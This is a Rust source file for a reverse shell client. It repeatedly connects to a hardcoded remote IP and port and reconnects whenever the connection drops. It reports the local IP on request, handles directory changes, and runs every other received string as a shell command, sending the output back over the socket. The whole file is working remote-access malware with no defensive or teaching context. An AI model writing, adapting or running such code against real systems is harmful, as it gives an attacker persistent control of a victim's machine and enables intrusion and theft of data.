use std::net::TcpStream;
// use std::net::Shutdown;
use std::io::Write;
use std::io::Read;
use std::process::Command;
use local_ip_address::local_ip;
use std::{thread, time};
use std::path::Path;
use std::env::set_current_dir;

//TODO 
//Implement multiple IP addresses and ports (eventually connect to the router)
//Refactor

fn connect(ip: &str) -> TcpStream {
    loop {
        match TcpStream::connect(ip){
            Ok(con) => {
                return con;
            },
            Err(_) => {
                // println!("trying to connect");
                thread::sleep(time::Duration::from_millis(2000));
                continue;
            }
        } 
    }
}

fn main() {
    let ip = "129.21.49.57:5678";
    let mut stream = connect(ip); //connects via TCP
    loop {
        let mut buffer = [0;1024]; //set the buffer
        let num_of_bytes = stream.read(&mut buffer).unwrap(); //read the buffer
        if num_of_bytes == 0{ //if the connection is lost
            thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
            stream = connect(ip); //connect again
            continue; //continue the loop
        }
        let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
        if recv.contains("getIP") { //if it's getIP, return the IP
            let local_ip = local_ip().unwrap(); //get the local IP
            let local_ip = format!("{}\n",local_ip); //format IP into string
            let local_ip = local_ip.as_bytes();
            stream.write(&local_ip).unwrap(); //send it
            continue;
        }
        if recv.len() > 2{
            if recv[..=1].eq("cd") { //if the first two letters are cd
                let path = Path::new(&recv[3..]); //the path is the remaining
                stream.write(match set_current_dir(path) { //write to the stream the current diretory after changing it
                    Ok(_) => { //if ok, return current directory
                        let cmd_out = if cfg!(windows) {
                            Command::new("CMD").arg("/C").arg("cd").output().unwrap()
                        } else {
                            Command::new("sh").arg("-c").arg("pwd").output().unwrap()
                        };
                        format!("Current Directory: {}", std::str::from_utf8(&cmd_out.stdout).unwrap())
                    }
                    Err(err) => {
                        format!("{}", err)
                    }
                }.as_bytes(),).unwrap();
                continue;
            } 
        }
        // println!("Command: {}",&recv);
        let output = Command::new("sh").arg("-c").arg(&recv).output().expect("execution failed from the client"); //run this
        let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
        // println!("Output: {}",stderrout);
        stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
    }
    // stream.shutdown(Shutdown::Both).expect("shutdown call failed");
}       